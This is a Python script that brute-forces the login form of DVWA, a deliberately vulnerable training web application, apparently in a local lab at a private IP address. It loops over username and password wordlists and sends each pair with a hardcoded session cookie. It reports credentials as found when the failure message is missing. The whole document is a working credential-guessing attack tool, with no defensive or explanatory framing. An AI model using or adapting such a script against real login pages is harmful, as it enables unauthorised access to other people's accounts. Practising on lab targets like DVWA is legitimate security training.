import requests

header = {"Cookie":"security=low; PHPSESSID=184146d3a15e65f12bef4261fe2dc56c;"}
    
username_list = open("username.txt","r").readlines()


for username1 in username_list:
    username = username1.strip()

    password_list = open("password.txt","r").readlines()
    for password1 in password_list:
        password = password1.strip()
        url = f'http://192.168.1.105//dvwa/vulnerabilities/brute/?username={username}&password={password}&Login=Login'

        result = requests.get(url=url,headers=header)
        print("Username: ",username)
        print("Password: ",password)
        print("Status code: ",result.status_code)
        print("Message Length: ",len(result.content))
        print("\n ************************************ \n")
        
        if  'Username and/or password incorrect.' in str(result.content):
            pass
        
        else:
                print("Uasername and Password found !!")
                print("Username: ---> " + username)
                print("Password: ---> " + password)
                exit()